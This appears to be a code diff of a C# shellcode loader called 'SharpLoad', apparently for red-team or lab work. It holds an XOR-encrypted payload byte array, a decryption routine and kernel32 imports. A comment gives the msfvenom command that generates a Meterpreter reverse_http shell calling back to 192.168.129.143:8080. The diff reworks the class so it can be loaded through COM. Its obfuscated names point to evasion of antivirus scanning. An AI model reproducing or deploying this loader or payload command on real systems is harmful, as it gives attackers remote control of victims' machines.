@@ -8,6 +8,7 @@ using System.Threading;
 
 namespace SharpLoad
 {
+    [ComVisible(true)]
     public class Load
     {
         [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
@@ -23,6 +24,11 @@ namespace SharpLoad
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         public delegate UInt32 ccccccccccccccc(IntPtr hHandle, UInt32 dwMilliseconds);
 
+        public Load()
+        {
+
+        }
+
         public static byte[] helloworld(byte[] e_buf, string key)
         {
             byte[] d_buf = new byte[e_buf.Length];
@@ -37,9 +43,10 @@ namespace SharpLoad
         }
 
 
-        public static void Execute()
+        public void Execute()
         {
-
+            Console.WriteLine("Testowy napis");
+            //msfvenom -p windows/x64/meterpreter/reverse_http --encrypt xor  --encrypt-key siemanko LHOST=192.168.129.143 LPORT=8080 -f csharp
             byte[] buf = new byte[563] {0x8f,0x21,0xe6,0x89,0x91,0x86,
 0xa7,0x6f,0x73,0x69,0x24,0x3c,0x20,0x3e,0x39,0x27,0x42,0xbb,
 0x00,0x25,0xea,0x3c,0x0b,0x3e,0x25,0x21,0xee,0x3f,0x79,0x26,
@@ -147,7 +154,10 @@ namespace SharpLoad
 
         public static void Main()
         {
-            Execute();
+            
+            Load obiekt = new Load();
+            obiekt.Execute();
+
             string userName = Console.ReadLine();
         }
     }
